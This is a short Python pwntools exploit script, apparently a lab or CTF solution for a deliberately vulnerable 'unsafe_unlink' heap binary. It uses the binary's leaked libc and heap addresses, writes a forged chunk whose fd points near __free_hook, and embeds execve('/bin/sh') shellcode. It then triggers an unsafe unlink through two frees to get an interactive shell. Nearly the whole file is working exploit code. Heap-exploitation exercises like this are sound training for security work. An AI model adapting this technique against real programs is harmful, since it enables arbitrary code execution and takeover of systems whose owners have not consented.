#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("unsafe_unlink")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

# Select the "free" option; send index.
def free(index):
    io.send("3")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Prepare execve("/bin/sh") shellcode with a jmp over where the fd will be written.
shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))

chunk_A=malloc(0x88)
chunk_B=malloc(0x88)

fd=libc.sym.__free_hook-0x18
bk=heap+0x20
prev_size=0x90
fake_size=0x90
edit(chunk_A,p64(fd)+p64(bk)+shellcode+p8(0)*(0x70-len(shellcode))+p64(prev_size)+p64(fake_size))

free(chunk_B)
free(chunk_A)
# =============================================================================

io.interactive()
